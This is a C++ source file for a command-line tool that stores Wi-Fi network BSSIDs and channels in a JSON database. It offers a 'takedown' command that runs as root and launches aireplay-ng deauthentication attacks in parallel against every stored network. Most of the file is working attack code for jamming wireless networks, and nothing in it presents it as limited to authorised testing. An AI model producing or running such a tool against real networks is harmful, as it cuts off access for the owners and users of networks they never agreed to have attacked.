#include <iostream>
#include <vector>
#include <fstream>
#include <string>
#include <unistd.h>
#include <sys/wait.h>
#include "nlohmann/json.hpp"
#include "../include/db.h"
#include <atomic>
#include <vector>
#include <thread>
using json = nlohmann::json;
void help(){
    std::cout << "Usage:\n";
    std::cout << "  add <bssid> <channel> <db_path> - Add a network to the database\n";
    std::cout << "  remove <bssid> <db_path> - Remove a network from the database\n";
    std::cout << "  takedown <packet_number> <interface> <db_path> - Deauth all networks in the database\n";
}

bool run_command(const char* program, char* const argv[]) {

    pid_t pid = fork();

    if (pid == 0) {
        execvp(program, argv);

        // only runs if exec failed
        perror("execvp");
        _exit(1);
    }

    int status;
    waitpid(pid, &status, 0);

    return WIFEXITED(status) && WEXITSTATUS(status) == 0;
}
int main(int argc, char* argv[]){
    if (argc < 2){
        std::cerr <<"You need to enter an operation." << std::endl;
        help();
        return 1;
    }
    std::string operation = argv[1];
    if (operation == "add"){
        if (argc < 5){
            std::cerr <<"add operation requires 3 arguments: bssid, channel and path to database file." << std::endl;
            return 1;
        }
        std::string bssid = argv[2];
        int channel = std::stoi(argv[3]);
        std::string path = argv[4];
        set_path(path);
        if (!exists_in_db(bssid)){
            std::cout << "Adding entry: " << bssid << " on channel " << channel << std::endl;
            add_entry(bssid, channel);
        } else {
            std::cout << "Entry already exists: " << bssid << std::endl;
        }
    } else if (operation == "remove"){
        if (argc < 4){
            std::cerr <<"remove operation requires 2 arguments: bssid and path to database file." << std::endl;
            return 1;
        }
        std::string bssid = argv[2];
        std::string path = argv[3];
        set_path(path);
        json j = load_bssid_database();
        remove_entry(bssid);
        std::cout << "Removed entry: " << bssid << std::endl;
    } else if (operation == "takedown") {

        if (geteuid() != 0) {
            std::cerr << "This program must be run as root!\n";
            return 1;
        }

        if (argc < 5) {
            std::cerr << "takedown requires: packet_number interface db\n";
            return 1;
        }

        std::string packet_number = argv[2];
        std::string interface = argv[3];
        std::string path = argv[4];

        //set_path(path);

        //json j = load_bssid_database();
        auto j = load_any_database(path);

        std::vector<pid_t> children;

        for (auto& network : j) {
            std::string bssid = network.bssid;
            int channel = network.channel;
            pid_t bg = fork();

            if (bg == 0) {

                char* cmd2[] = {
                    (char*)"aireplay-ng",
                    (char*)"--deauth",
                    (char*)packet_number.c_str(),
                    (char*)"-a",
                    (char*)bssid.c_str(),
                    (char*)interface.c_str(),
                    nullptr
                };

                char* cmd1[] = {
                    (char*)"iwconfig",
                    (char*)interface.c_str(),
                    (char*)"channel",
                    (char*)std::to_string(channel).c_str(),
                    nullptr
                };

                if (run_command("iwconfig", cmd1)) {
                    run_command("aireplay-ng", cmd2);
                }

                _exit(0);
            }

            // parent only
            children.push_back(bg);

            sleep(1);
        }
        for (pid_t pid : children) {
            waitpid(pid, nullptr, 0);
        }
    }else if (operation == "help") {
        help();
    } else {
        std::cerr << "Unknown operation: " << operation << std::endl;
        help();
        return 1;
    }
}
